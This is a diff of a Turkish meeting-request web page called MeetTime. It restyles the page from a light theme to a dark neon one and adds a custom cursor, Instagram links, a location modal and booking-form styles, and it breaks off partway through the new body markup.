@@ -2,1188 +2,2495 @@
 <html lang="tr">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width,initial-scale=1.0">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
 
-<title>MeetTime</title>
-
-<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Crect width='100' height='100' rx='25' fill='%2316a34a'/%3E%3Ccircle cx='50' cy='50' r='27' fill='none' stroke='white' stroke-width='7'/%3E%3Cpath d='M23 50h54M50 23c10 9 10 45 0 54M50 23c-10 9-10 45 0 54' fill='none' stroke='white' stroke-width='5'/%3E%3C/svg%3E">
+<title>MeetTime — Buluşmanı Planla</title>
 
 <style>
-*{
-  box-sizing:border-box;
-  margin:0;
-  padding:0;
-}
+@import url('https://fonts.googleapis.com/css2?family=DM+Sans:wght@400;500;600;700;800&family=Space+Grotesk:wght@500;600;700&display=swap');
 
 :root{
-  --green:#16a34a;
-  --green-dark:#15803d;
-  --green-light:#dcfce7;
-  --green-soft:#f0fdf4;
-  --border:#e5e7eb;
-  --text:#171717;
-  --muted:#737373;
+    --bg:#080b0a;
+    --panel:rgba(255,255,255,.055);
+    --panel-hover:rgba(255,255,255,.09);
+    --border:rgba(255,255,255,.10);
+    --text:#f5f3ff;
+    --muted:#969da0;
+
+    --green:#39ff88;
+    --green2:#20e67b;
+    --purple:#7c5cff;
+    --pink:#ff4d9d;
+    --orange:#ff9d45;
+}
+
+*{
+    margin:0;
+    padding:0;
+    box-sizing:border-box;
+    cursor:none !important;
+}
+
+html{
+    scroll-behavior:smooth;
 }
 
 body{
-  font-family:Inter,Arial,sans-serif;
-  background:#f6f7f6;
-  color:var(--text);
-  min-height:100vh;
+    font-family:"DM Sans",Arial,sans-serif;
+    background:
+        radial-gradient(circle at 15% 10%,rgba(57,255,136,.10),transparent 25%),
+        radial-gradient(circle at 85% 25%,rgba(124,92,255,.12),transparent 25%),
+        radial-gradient(circle at 50% 90%,rgba(57,255,136,.07),transparent 30%),
+        var(--bg);
+    color:var(--text);
+    min-height:100vh;
+    overflow-x:hidden;
+}
+
+body::before{
+    content:"";
+    position:fixed;
+    inset:0;
+    pointer-events:none;
+    opacity:.20;
+    background-image:
+        linear-gradient(rgba(255,255,255,.025) 1px,transparent 1px),
+        linear-gradient(90deg,rgba(255,255,255,.025) 1px,transparent 1px);
+    background-size:45px 45px;
+    mask-image:linear-gradient(to bottom,black,transparent);
+}
+
+a{
+    text-decoration:none;
+    color:inherit;
 }
 
 button,input,select,textarea{
-  font:inherit;
+    font:inherit;
 }
 
-button{
-  cursor:pointer;
+/* =========================================================
+   CUSTOM CURSOR
+========================================================= */
+
+.custom-cursor{
+    position:fixed;
+    left:0;
+    top:0;
+    width:22px;
+    height:22px;
+    border-radius:50%;
+    background:#39ff88;
+    box-shadow:
+        0 0 10px rgba(57,255,136,.9),
+        0 0 25px rgba(57,255,136,.55),
+        0 0 50px rgba(57,255,136,.25);
+    pointer-events:none;
+    z-index:999999;
+    transform:translate(-50%,-50%) scale(1);
+    transition:
+        transform .25s cubic-bezier(.2,.8,.2,1),
+        width .2s ease,
+        height .2s ease,
+        box-shadow .25s ease,
+        opacity .2s ease;
 }
 
-/* =========================
+.custom-cursor.moving{
+    transform:translate(-50%,-50%) scale(.45);
+}
+
+.custom-cursor.hover{
+    transform:translate(-50%,-50%) scale(1.65);
+    box-shadow:
+        0 0 15px rgba(57,255,136,1),
+        0 0 35px rgba(57,255,136,.7),
+        0 0 70px rgba(57,255,136,.35);
+}
+
+/* =========================================================
    HEADER
-========================= */
+========================================================= */
 
 header{
-  height:70px;
-  background:#fff;
-  border-bottom:1px solid var(--border);
-  display:flex;
-  align-items:center;
-  justify-content:space-between;
-  padding:0 6%;
-  position:sticky;
-  top:0;
-  z-index:20;
+    width:min(1180px,calc(100% - 32px));
+    height:72px;
+    position:sticky;
+    top:15px;
+    margin:15px auto 0;
+    z-index:100;
+    display:flex;
+    align-items:center;
+    justify-content:space-between;
+    padding:0 14px 0 22px;
+    background:rgba(10,15,13,.76);
+    backdrop-filter:blur(22px);
+    -webkit-backdrop-filter:blur(22px);
+    border:1px solid rgba(57,255,136,.12);
+    border-radius:20px;
+    box-shadow:0 15px 50px rgba(0,0,0,.20);
 }
 
 .logo{
-  font-size:25px;
-  font-weight:900;
-  color:var(--green);
-  letter-spacing:-1px;
+    font-family:"Space Grotesk",sans-serif;
+    font-size:22px;
+    font-weight:700;
+    letter-spacing:-1px;
+    display:flex;
+    align-items:center;
+    gap:10px;
+}
+
+.logo::before{
+    content:"";
+    width:9px;
+    height:9px;
+    flex-shrink:0;
+    border-radius:50%;
+    background:linear-gradient(135deg,#39ff88,#20e67b,#7c5cff);
+    box-shadow:
+        0 0 10px rgba(57,255,136,.9),
+        0 0 22px rgba(57,255,136,.45);
+    transition:.3s;
+}
+
+.logo:hover::before{
+    transform:scale(1.4);
 }
 
 .header-right{
-  display:flex;
-  align-items:center;
-  gap:10px;
+    display:flex;
+    align-items:center;
+    gap:8px;
 }
 
-.location-btn{
-  width:42px;
-  height:42px;
-  border-radius:12px;
-  border:1px solid #d1d5db;
-  background:#fff;
-  display:grid;
-  place-items:center;
-  transition:.2s;
+nav{
+    display:flex;
+    align-items:center;
+    gap:6px;
 }
 
-.location-btn:hover{
-  background:var(--green-soft);
-  border-color:#86efac;
-  transform:translateY(-1px);
+nav a{
+    padding:10px 14px;
+    border-radius:12px;
+    color:#a9b0b0;
+    font-size:13px;
+    font-weight:600;
+    transition:.25s ease;
 }
 
-.location-btn svg{
-  width:22px;
-  height:22px;
-  stroke:#16a34a;
+nav a:hover{
+    color:#39ff88;
+    background:rgba(57,255,136,.06);
+    transform:translateY(-2px);
 }
 
-/* =========================
+/* =========================================================
+   LOCATION BUTTON
+========================================================= */
+
+.location-button{
+    width:44px;
+    height:44px;
+    border-radius:14px;
+    border:1px solid rgba(57,255,136,.18);
+    background:rgba(57,255,136,.055);
+    color:#39ff88;
+    display:grid;
+    place-items:center;
+    font-size:20px;
+    transition:.3s cubic-bezier(.2,.8,.2,1);
+}
+
+.location-button:hover{
+    transform:translateY(-3px) scale(1.04);
+    background:rgba(57,255,136,.11);
+    border-color:rgba(57,255,136,.4);
+    box-shadow:0 10px 30px rgba(57,255,136,.12);
+}
+
+.location-button.connected{
+    background:rgba(57,255,136,.12);
+    border-color:rgba(57,255,136,.45);
+    box-shadow:
+        0 0 15px rgba(57,255,136,.12),
+        inset 0 0 15px rgba(57,255,136,.04);
+}
+
+/* =========================================================
+   LOCATION MODAL
+========================================================= */
+
+.location-modal{
+    position:fixed;
+    inset:0;
+    display:none;
+    align-items:center;
+    justify-content:center;
+    padding:20px;
+    z-index:2000;
+    background:rgba(0,0,0,.68);
+    backdrop-filter:blur(12px);
+}
+
+.location-modal.show{
+    display:flex;
+}
+
+.location-box{
+    width:min(460px,100%);
+    position:relative;
+    padding:34px;
+    border-radius:28px;
+    border:1px solid rgba(57,255,136,.18);
+    background:#101714;
+    box-shadow:0 30px 100px rgba(0,0,0,.55);
+    animation:locationPopup .3s cubic-bezier(.2,.8,.2,1);
+    text-align:center;
+}
+
+@keyframes locationPopup{
+    from{
+        opacity:0;
+        transform:translateY(20px) scale(.95);
+    }
+    to{
+        opacity:1;
+        transform:none;
+    }
+}
+
+.location-icon{
+    width:68px;
+    height:68px;
+    margin:0 auto 20px;
+    display:grid;
+    place-items:center;
+    border-radius:23px;
+    background:linear-gradient(135deg,#39ff88,#20e67b,#7c5cff);
+    color:#061009;
+    font-size:30px;
+    box-shadow:0 15px 40px rgba(57,255,136,.18);
+}
+
+.location-box h3{
+    font-family:"Space Grotesk",sans-serif;
+    font-size:27px;
+    letter-spacing:-1px;
+}
+
+.location-status{
+    margin:12px 0 8px;
+    color:#39ff88;
+    font-weight:800;
+    font-size:15px;
+}
+
+.location-description{
+    color:var(--muted);
+    line-height:1.7;
+    font-size:14px;
+}
+
+.location-spinner{
+    width:25px;
+    height:25px;
+    margin:20px auto;
+    border:3px solid rgba(57,255,136,.15);
+    border-top-color:#39ff88;
+    border-radius:50%;
+    animation:spin .8s linear infinite;
+}
+
+@keyframes spin{
+    to{transform:rotate(360deg);}
+}
+
+.location-close{
+    margin-top:20px;
+    padding:12px 24px;
+    border:0;
+    border-radius:13px;
+    color:white;
+    background:rgba(255,255,255,.08);
+    transition:.25s;
+}
+
+.location-close:hover{
+    color:#39ff88;
+    background:rgba(57,255,136,.09);
+    transform:translateY(-3px);
+}
+
+.location-success{
+    display:none;
+}
+
+.location-success.show{
+    display:block;
+}
+
+/* =========================================================
    HERO
-========================= */
+========================================================= */
 
 .hero{
-  max-width:900px;
-  margin:auto;
-  padding:65px 20px 30px;
-  text-align:center;
+    min-height:680px;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    padding:100px 20px 80px;
+    position:relative;
+}
+
+.hero-inner{
+    max-width:920px;
+    text-align:center;
+    position:relative;
+    z-index:2;
 }
 
 .badge{
-  display:inline-flex;
-  align-items:center;
-  gap:7px;
-  padding:7px 12px;
-  border-radius:999px;
-  background:var(--green-light);
-  color:var(--green-dark);
-  font-size:12px;
-  font-weight:800;
-  margin-bottom:18px;
+    display:inline-flex;
+    align-items:center;
+    gap:8px;
+    padding:9px 15px;
+    border-radius:999px;
+    font-size:11px;
+    font-weight:800;
+    letter-spacing:1.5px;
+    color:#baffd2;
+    background:rgba(57,255,136,.055);
+    border:1px solid rgba(57,255,136,.22);
 }
 
-.badge-dot{
-  width:7px;
-  height:7px;
-  background:#22c55e;
-  border-radius:50%;
-  animation:pulse 1.5s infinite;
-}
-
-@keyframes pulse{
-  0%,100%{opacity:1}
-  50%{opacity:.35}
+.badge::before{
+    content:"";
+    width:7px;
+    height:7px;
+    border-radius:50%;
+    background:#39ff88;
+    box-shadow:0 0 12px #39ff88;
 }
 
 .hero h1{
-  font-size:clamp(34px,6vw,60px);
-  line-height:1.05;
-  letter-spacing:-2.5px;
-  margin-bottom:16px;
+    font-family:"Space Grotesk",sans-serif;
+    font-size:clamp(52px,8vw,104px);
+    line-height:.93;
+    letter-spacing:-6px;
+    margin:28px 0 25px;
 }
 
-.hero h1 span{
-  color:var(--green);
+.gradient{
+    background:linear-gradient(90deg,#39ff88,#52f3a0,#8affbc,#7c5cff);
+    background-size:200% auto;
+    -webkit-background-clip:text;
+    background-clip:text;
+    color:transparent;
+    animation:gradientMove 5s linear infinite;
+}
+
+@keyframes gradientMove{
+    to{background-position:200% center;}
 }
 
 .hero p{
-  color:var(--muted);
-  font-size:16px;
-  line-height:1.6;
-  max-width:600px;
-  margin:auto;
+    max-width:620px;
+    margin:auto;
+    color:var(--muted);
+    font-size:17px;
+    line-height:1.8;
 }
 
-/* =========================
-   CARD
-========================= */
+/* =========================================================
+   BUTTONS
+========================================================= */
 
-.container{
-  width:min(720px,92%);
-  margin:20px auto 70px;
+.hero-buttons{
+    margin-top:35px;
+    display:flex;
+    justify-content:center;
+    align-items:center;
+    gap:12px;
+    flex-wrap:wrap;
 }
 
-.card{
-  background:#fff;
-  border:1px solid var(--border);
-  border-radius:24px;
-  padding:30px;
-  box-shadow:0 15px 45px rgba(0,0,0,.05);
+.btn,
+.submit,
+.instagram-btn,
+.how-close,
+.close{
+    position:relative;
+    border:0;
+    cursor:none;
+    transition:.3s cubic-bezier(.2,.8,.2,1);
 }
 
-.card-title{
-  font-size:22px;
-  font-weight:900;
-  margin-bottom:6px;
+.primary,
+.submit,
+.how-close{
+    display:inline-flex;
+    align-items:center;
+    justify-content:center;
+    gap:12px;
+    padding:15px 22px;
+    border-radius:14px;
+    color:#061009;
+    font-weight:800;
+    font-size:14px;
+    background:linear-gradient(135deg,#39ff88,#20e67b,#7c5cff);
+    box-shadow:0 12px 35px rgba(57,255,136,.18);
 }
 
-.card-sub{
-  color:var(--muted);
-  font-size:13px;
-  margin-bottom:25px;
+.primary::after{
+    content:"→";
+    font-size:20px;
+    transition:.3s;
 }
 
-/* =========================
-   FORM
-========================= */
+.primary:hover::after{
+    transform:translateX(5px);
+}
 
-.form-group{
-  margin-bottom:17px;
+.primary:hover,
+.submit:hover,
+.how-close:hover{
+    transform:translateY(-4px);
+    box-shadow:0 20px 45px rgba(57,255,136,.28);
+}
+
+.secondary{
+    padding:14px 18px;
+    border-radius:14px;
+    color:#c9d0ce;
+    background:rgba(255,255,255,.045);
+    border:1px solid rgba(57,255,136,.12);
+    font-size:13px;
+    font-weight:700;
+}
+
+.secondary:hover{
+    background:rgba(57,255,136,.08);
+    color:#39ff88;
+    transform:translateY(-3px);
+    border-color:rgba(57,255,136,.3);
+}
+
+.submit:disabled{
+    opacity:.6;
+    cursor:not-allowed !important;
+    transform:none;
+}
+
+/* =========================================================
+   SECTION
+========================================================= */
+
+.section{
+    width:min(1100px,calc(100% - 32px));
+    margin:auto;
+    padding:90px 0;
+}
+
+.section-title{
+    text-align:center;
+    margin-bottom:45px;
+}
+
+.section-title span{
+    display:inline-block;
+    color:#79ffa9;
+    font-size:11px;
+    letter-spacing:4px;
+    font-weight:800;
+}
+
+.section-title h2{
+    font-family:"Space Grotesk",sans-serif;
+    font-size:clamp(38px,5vw,58px);
+    letter-spacing:-3px;
+    margin-top:10px;
+}
+
+/* =========================================================
+   CALENDAR
+========================================================= */
+
+.calendar-card{
+    position:relative;
+    overflow:hidden;
+    padding:34px;
+    background:rgba(13,20,17,.68);
+    border:1px solid rgba(57,255,136,.11);
+    border-radius:28px;
+    backdrop-filter:blur(20px);
+    box-shadow:0 30px 80px rgba(0,0,0,.18);
+}
+
+.calendar-card::before{
+    content:"";
+    position:absolute;
+    width:400px;
+    height:400px;
+    border-radius:50%;
+    background:rgba(57,255,136,.08);
+    filter:blur(80px);
+    right:-150px;
+    top:-250px;
+    pointer-events:none;
+}
+
+.calendar-head{
+    display:flex;
+    justify-content:space-between;
+    align-items:center;
+    position:relative;
+}
+
+.calendar-head small{
+    color:#7dffa9;
+    letter-spacing:3px;
+    font-size:10px;
+    font-weight:800;
+}
+
+.calendar-head h3{
+    font-family:"Space Grotesk",sans-serif;
+    font-size:30px;
+    letter-spacing:-1.5px;
+    margin-top:7px;
+}
+
+.calendar-icon{
+    width:55px;
+    height:55px;
+    display:grid;
+    place-items:center;
+    border-radius:18px;
+    font-size:25px;
+    color:#39ff88;
+    background:rgba(57,255,136,.055);
+    border:1px solid rgba(57,255,136,.16);
+}
+
+.calendar-note{
+    color:var(--muted);
+    margin:20px 0 28px;
+}
+
+.days-grid{
+    display:grid;
+    grid-template-columns:repeat(3,1fr);
+    gap:14px;
+}
+
+.day-card{
+    min-height:145px;
+    position:relative;
+    overflow:hidden;
+    padding:20px;
+    text-align:left;
+    border-radius:22px;
+    border:1px solid rgba(255,255,255,.09);
+    color:white;
+    background:rgba(255,255,255,.035);
+    cursor:none !important;
+    transition:.35s cubic-bezier(.2,.8,.2,1);
+}
+
+.day-card::before{
+    content:"";
+    position:absolute;
+    inset:0;
+    background:linear-gradient(135deg,rgba(57,255,136,.13),rgba(32,230,123,.07),rgba(124,92,255,.14));
+    opacity:0;
+    transition:.3s;
+}
+
+.day-card span,
+.day-card b{
+    position:relative;
+    z-index:1;
+    display:block;
+}
+
+.day-card span{
+    color:#9ca6a2;
+    font-size:13px;
+    font-weight:700;
+}
+
+.day-card b{
+    margin-top:28px;
+    font-family:"Space Grotesk",sans-serif;
+    font-size:40px;
+    color:white;
+}
+
+.day-card:hover{
+    transform:translateY(-8px);
+    border-color:rgba(57,255,136,.4);
+    box-shadow:0 20px 40px rgba(0,0,0,.28);
+}
+
+.day-card:hover::before{
+    opacity:1;
+}
+
+/* =========================================================
+   BACK BUTTON
+========================================================= */
+
+.back-btn{
+    display:inline-flex;
+    align-items:center;
+    gap:9px;
+    padding:12px 17px;
+    border-radius:999px;
+    color:#b9c0bd;
+    background:rgba(255,255,255,.04);
+    border:1px solid rgba(57,255,136,.12);
+    cursor:none !important;
+    font-weight:700;
+    transition:.25s;
+}
+
+.back-btn:hover{
+    color:#39ff88;
+    transform:translateX(-5px);
+    background:rgba(57,255,136,.06);
+}
+
+/* =========================================================
+   BOOKING
+========================================================= */
+
+.booking-layout{
+    display:grid;
+    grid-template-columns:.75fr 1.25fr;
+    gap:22px;
+}
+
+.info-card,
+.form-card{
+    background:rgba(13,20,17,.68);
+    border:1px solid rgba(57,255,136,.11);
+    border-radius:28px;
+    padding:30px;
+    backdrop-filter:blur(20px);
+}
+
+.info-card{
+    min-height:250px;
+}
+
+.info-card::before{
+    content:"01";
+    display:block;
+    font-family:"Space Grotesk",sans-serif;
+    font-size:52px;
+    font-weight:700;
+    color:rgba(57,255,136,.06);
+    margin-bottom:10px;
+}
+
+.info-card h3{
+    font-family:"Space Grotesk",sans-serif;
+    font-size:25px;
+}
+
+.info-card p{
+    margin-top:10px;
+    color:var(--muted);
+    font-size:14px;
+}
+
+form{
+    display:grid;
+    gap:17px;
 }
 
 label{
-  display:block;
-  font-size:12px;
-  font-weight:800;
-  margin-bottom:7px;
+    display:block;
+    margin-bottom:8px;
+    font-size:11px;
+    letter-spacing:1px;
+    text-transform:uppercase;
+    color:#9fa8a4;
+    font-weight:800;
 }
 
 input,
 select,
 textarea{
-  width:100%;
-  border:1px solid #d9d9d9;
-  border-radius:11px;
-  padding:13px;
-  outline:none;
-  background:#fff;
-  transition:.2s;
+    width:100%;
+    outline:none;
+    color:white;
+    background:rgba(255,255,255,.045);
+    border:1px solid rgba(255,255,255,.09);
+    border-radius:15px;
+    padding:14px 15px;
+    cursor:none !important;
+    transition:.25s;
+}
+
+input::placeholder,
+textarea::placeholder{
+    color:#676f6c;
+}
+
+select option{
+    background:#121916;
+    color:white;
 }
 
 textarea{
-  min-height:100px;
-  resize:vertical;
+    min-height:115px;
+    resize:vertical;
 }
 
 input:focus,
 select:focus,
 textarea:focus{
-  border-color:var(--green);
-  box-shadow:0 0 0 3px rgba(22,163,74,.10);
-}
-
-.row{
-  display:grid;
-  grid-template-columns:1fr 1fr;
-  gap:14px;
+    border-color:rgba(57,255,136,.65);
+    background:rgba(57,255,136,.035);
+    box-shadow:0 0 0 4px rgba(57,255,136,.07);
 }
 
 .submit{
-  width:100%;
-  border:0;
-  border-radius:12px;
-  padding:15px;
-  color:#fff;
-  background:var(--green);
-  font-weight:900;
-  margin-top:8px;
-  transition:.2s;
+    width:100%;
+    margin-top:5px;
+    min-height:52px;
 }
 
-.submit:hover{
-  background:var(--green-dark);
-  transform:translateY(-1px);
+/* =========================================================
+   INSTAGRAM
+========================================================= */
+
+.instagram{
+    width:min(1100px,calc(100% - 32px));
+    margin:30px auto 90px;
+    padding:55px 30px;
+    text-align:center;
+    border-radius:32px;
+    border:1px solid rgba(57,255,136,.11);
+    background:radial-gradient(circle at center,rgba(57,255,136,.10),transparent 50%),rgba(13,20,17,.68);
 }
 
-.submit:disabled{
-  opacity:.6;
-  cursor:not-allowed;
+.instagram h2{
+    font-family:"Space Grotesk",sans-serif;
+    font-size:48px;
+    letter-spacing:-2px;
 }
 
-/* =========================
-   RESULT
-========================= */
-
-.result{
-  display:none;
-  margin-top:18px;
-  padding:15px;
-  border-radius:12px;
-  font-size:13px;
-  line-height:1.5;
+.instagram p{
+    color:var(--muted);
+    margin:10px 0 25px;
 }
 
-.result.success{
-  display:block;
-  background:var(--green-soft);
-  border:1px solid #bbf7d0;
-  color:#166534;
+.instagram-btn{
+    display:inline-flex;
+    align-items:center;
+    justify-content:center;
+    margin:5px;
+    padding:14px 20px;
+    border-radius:14px;
+    color:white;
+    font-size:13px;
+    font-weight:800;
+    background:rgba(255,255,255,.06);
+    border:1px solid rgba(57,255,136,.12);
 }
 
-.result.error{
-  display:block;
-  background:#fff1f2;
-  border:1px solid #fecdd3;
-  color:#be123c;
+.instagram-btn:hover{
+    transform:translateY(-4px) rotate(-1deg);
+    color:#061009;
+    background:linear-gradient(135deg,#39ff88,#20e67b,#7c5cff);
 }
 
-/* =========================
-   LOCATION MODAL
-========================= */
-
-.location-overlay{
-  display:none;
-  position:fixed;
-  inset:0;
-  background:rgba(0,0,0,.55);
-  z-index:100;
-  align-items:center;
-  justify-content:center;
-  padding:20px;
-}
-
-.location-overlay.open{
-  display:flex;
-}
-
-.location-box{
-  width:min(420px,95vw);
-  background:#fff;
-  border-radius:22px;
-  padding:28px;
-  box-shadow:0 25px 80px rgba(0,0,0,.25);
-  text-align:center;
-}
-
-.location-icon{
-  width:65px;
-  height:65px;
-  margin:0 auto 16px;
-  border-radius:18px;
-  background:var(--green-light);
-  display:grid;
-  place-items:center;
-}
-
-.location-icon svg{
-  width:34px;
-  height:34px;
-  stroke:var(--green-dark);
-}
-
-.location-box h2{
-  font-size:21px;
-  margin-bottom:8px;
-}
-
-.location-box p{
-  color:var(--muted);
-  font-size:13px;
-  line-height:1.5;
-  margin-bottom:20px;
-}
-
-.location-actions{
-  display:flex;
-  gap:9px;
-}
-
-.location-actions button{
-  flex:1;
-  padding:12px;
-  border-radius:10px;
-  font-weight:800;
-}
-
-.allow-location{
-  border:0;
-  background:var(--green);
-  color:#fff;
-}
-
-.cancel-location{
-  border:1px solid #ddd;
-  background:#fff;
-}
-
-/* =========================
-   LOCATION STATUS
-========================= */
-
-.location-status{
-  display:none;
-  margin-top:15px;
-  padding:12px;
-  border-radius:11px;
-  background:var(--green-soft);
-  border:1px solid #bbf7d0;
-  color:#166534;
-  font-size:12px;
-  text-align:left;
-}
-
-.location-status.show{
-  display:block;
-}
-
-.status-dot{
-  display:inline-block;
-  width:7px;
-  height:7px;
-  background:#22c55e;
-  border-radius:50%;
-  margin-right:5px;
-}
-
-/* =========================
-   SCAN SCREEN
-========================= */
-
-.scan-overlay{
-  display:none;
-  position:fixed;
-  inset:0;
-  background:#f0fdf4;
-  z-index:200;
-  align-items:center;
-  justify-content:center;
-  padding:25px;
-}
-
-.scan-overlay.open{
-  display:flex;
-}
-
-.scan-box{
-  width:min(430px,95vw);
-  text-align:center;
-}
-
-.scan-logo{
-  width:78px;
-  height:78px;
-  margin:auto;
-  border-radius:24px;
-  background:var(--green);
-  display:grid;
-  place-items:center;
-  box-shadow:0 15px 40px rgba(22,163,74,.22);
-}
-
-.scan-logo svg{
-  width:43px;
-  height:43px;
-  stroke:#fff;
-}
-
-.scan-box h2{
-  font-size:23px;
-  margin-top:25px;
-}
-
-.scan-text{
-  margin-top:8px;
-  color:var(--muted);
-  font-size:13px;
-  min-height:20px;
-}
-
-.progress{
-  height:6px;
-  background:#dcfce7;
-  border-radius:999px;
-  margin-top:28px;
-  overflow:hidden;
-}
-
-.progress-bar{
-  width:0%;
-  height:100%;
-  background:var(--green);
-  border-radius:999px;
-  transition:width .5s ease;
-}
-
-.scan-info{
-  margin-top:15px;
-  color:#4b5563;
-  font-size:11px;
-}
-
-/* =========================
+/* =========================================================
    FOOTER
-========================= */
+========================================================= */
 
 footer{
-  text-align:center;
-  color:#999;
-  font-size:11px;
-  padding:25px;
+    width:min(1180px,calc(100% - 32px));
+    margin:0 auto 25px;
+    display:flex;
+    justify-content:space-between;
+    padding:25px;
+    border-top:1px solid rgba(57,255,136,.10);
+    color:#6e7773;
+    font-size:12px;
 }
 
-@media(max-width:600px){
-  header{
-    padding:0 18px;
-  }
+footer strong{
+    color:#dce7e1;
+}
 
-  .hero{
-    padding-top:45px;
-  }
+/* =========================================================
+   HOW MODAL + SUCCESS MODAL
+========================================================= */
 
-  .card{
-    padding:22px;
-  }
+.modal,
+.how-modal{
+    position:fixed;
+    inset:0;
+    display:none;
+    align-items:center;
+    justify-content:center;
+    padding:20px;
+    z-index:999;
+    background:rgba(0,0,0,.65);
+    backdrop-filter:blur(10px);
+}
 
-  .row{
-    grid-template-columns:1fr;
-    gap:0;
-  }
+.modal.show,
+.how-modal.show{
+    display:flex;
+}
 
-  .location-actions{
-    flex-direction:column;
-  }
+.modal-box,
+.how-modal-box{
+    width:min(540px,100%);
+    position:relative;
+    padding:35px;
+    border-radius:28px;
+    border:1px solid rgba(57,255,136,.14);
+    background:#101714;
+    box-shadow:0 30px 100px rgba(0,0,0,.5);
+    animation:popup .3s cubic-bezier(.2,.8,.2,1);
+}
+
+@keyframes popup{
+    from{
+        opacity:0;
+        transform:translateY(20px) scale(.96);
+    }
+    to{
+        opacity:1;
+        transform:none;
+    }
+}
+
+.modal-box{
+    text-align:center;
+}
+
+.check{
+    width:62px;
+    height:62px;
+    display:grid;
+    place-items:center;
+    margin:0 auto 18px;
+    border-radius:22px;
+    background:linear-gradient(135deg,#39ff88,#20e67b);
+    color:#061009;
+    font-size:30px;
+    font-weight:800;
+}
+
+.modal-box h3,
+.how-modal-box h3{
+    font-family:"Space Grotesk",sans-serif;
+    font-size:27px;
+}
+
+.modal-box p,
+.how-modal-box p{
+    color:var(--muted);
+    line-height:1.7;
+    margin:10px 0 22px;
+}
+
+.close{
+    padding:12px 25px;
+    border-radius:13px;
+    color:white;
+    background:rgba(255,255,255,.09);
+}
+
+.close:hover{
+    background:rgba(57,255,136,.10);
+    color:#39ff88;
+    transform:translateY(-3px);
+}
+
+.how-icon{
+    width:55px;
+    height:55px;
+    display:grid;
+    place-items:center;
+    border-radius:18px;
+    background:linear-gradient(135deg,#39ff88,#20e67b,#7c5cff);
+    color:#061009;
+    font-size:25px;
+    font-weight:800;
+    margin-bottom:15px;
+}
+
+.how-steps{
+    display:grid;
+    gap:10px;
+    margin:20px 0;
+}
+
+.how-step{
+    display:flex;
+    gap:14px;
+    padding:15px;
+    border-radius:17px;
+    border:1px solid rgba(255,255,255,.08);
+    background:rgba(255,255,255,.035);
+    color:#aaa7b8;
+    font-size:13px;
+    line-height:1.6;
+}
+
+.how-step b{
+    color:#39ff88;
+    font-size:16px;
+}
+
+.how-step strong{
+    color:white;
+}
+
+.how-x{
+    position:absolute;
+    right:18px;
+    top:18px;
+    width:37px;
+    height:37px;
+    border:1px solid rgba(57,255,136,.12);
+    border-radius:50%;
+    background:rgba(255,255,255,.06);
+    color:white;
+    cursor:none !important;
+    font-size:20px;
+    transition:.2s;
+}
+
+.how-x:hover{
+    transform:rotate(90deg);
+    color:#39ff88;
+}
+
+/* =========================================================
+   RESPONSIVE
+========================================================= */
+
+@media(max-width:800px){
+
+    *{
+        cursor:auto !important;
+    }
+
+    .custom-cursor{
+        display:none;
+    }
+
+    header{
+        width:calc(100% - 20px);
+        top:8px;
+        margin-top:8px;
+    }
+
+    nav{
+        display:none;
+    }
+
+    .hero{
+        min-height:600px;
+        padding-top:80px;
+    }
+
+    .hero h1{
+        letter-spacing:-4px;
+    }
+
+    .days-grid{
+        grid-template-columns:repeat(2,1fr);
+    }
+
+    .booking-layout{
+        grid-template-columns:1fr;
+    }
+
+    footer{
+        flex-direction:column;
+        gap:10px;
+        text-align:center;
+    }
+}
+
+@media(max-width:500px){
+
+    .hero-buttons{
+        flex-direction:column;
+        align-items:stretch;
+    }
+
+    .hero-buttons .btn{
+        width:100%;
+    }
+
+    .calendar-card,
+    .form-card,
+    .info-card{
+        padding:22px;
+        border-radius:23px;
+    }
+
+    .calendar-head h3{
+        font-size:23px;
+    }
+
+    .day-card{
+        min-height:120px;
+    }
+
+    .instagram h2{
+        font-size:38px;
+    }
+
+    .location-box{
+        padding:28px 22px;
+    }
 }
 </style>
 </head>
 
 <body>
 
-<header>
-  <div class="logo">MeetTime</div>
+<div class="custom-cursor" id="customCursor"></div>
 
-  <div class="header-right">
-    <button class="location-btn" id="locationBtn" title="Konum">
-      <svg viewBox="0 0 24 24" fill="none" stroke-width="2">
-        <circle cx="12" cy="12" r="8"></circle>
-        <path d="M12 4V2M12 22v-2M4 12H2m20 0h-2"></path>
-        <circle cx="12" cy="12" r="2.5"></circle>
-      </svg>
-    </button>
-  </div>
+<header>
+
+    <a class="logo" href="#">
+        MeetTime
+    </a>
+
+    <div class="header-right">
+
+        <nav>
+
+            <a href="#randevu">
+                Randevu
+            </a>
+
+            <a href="#hakkinda">
+                Nasıl Çalışır?
+            </a>
+
+            <a href="https://www.instagram.com/a.arslan1636/?hl=tr" target="_blank">
+                @a.arslan1636
+            </a>
+
+            <a href="https://www.instagram.com/kadzoka11/" target="_blank">
+                @kadzoka11
+            </a>
+
+        </nav>
+
+        <!-- DÜNYA / KONUM BUTONU -->
+        <button
+            class="location-button"
+            id="locationButton"
+            type="button"
+            aria-label="Konum ayarları"
+            title="Konum"
+        >
+            🌐
+        </button>
+
+    </div>
+
 </header>
 
-<section class="hero">
 
-  <div class="badge">
-    <span class="badge-dot"></span>
-    MeetTime aktif
-  </div>
+<!-- =========================================================
+     KONUM MODAL
+========================================================= -->
 
-  <h1>
-    Bir buluşma için<br>
-    <span>doğru zamanı</span> bul.
-  </h1>
+<div
+    class="location-modal"
+    id="locationModal"
+>
 
-  <p>
-    Görüşmek istediğin kişiyi seç, uygun zamanı belirle
-    ve MeetTime üzerinden başvurunu gönder.
-  </p>
+    <div class="location-box">
 
-</section>
-
-<main class="container">
-
-  <section class="card">
-
-    <div class="card-title">Buluşma Başvurusu</div>
-
-    <div class="card-sub">
-      Bilgilerini doldur ve başvurunu gönder.
-    </div>
-
-    <form id="applicationForm">
-
-      <div class="form-group">
-        <label>Ad Soyad</label>
-        <input
-          id="name"
-          type="text"
-          placeholder="Adınız ve soyadınız"
-          maxlength="100"
-          required
+        <button
+            class="how-x"
+            id="locationX"
+            type="button"
+            aria-label="Kapat"
         >
-      </div>
+            ×
+        </button>
 
-      <div class="form-group">
-        <label>Kiminle görüşmek istiyorsun?</label>
-
-        <select id="person" required>
-          <option value="">Seçiniz</option>
-          <option value="Kadir">Kadir</option>
-          <option value="Arslan">Arslan</option>
-        </select>
-      </div>
-
-      <div class="form-group">
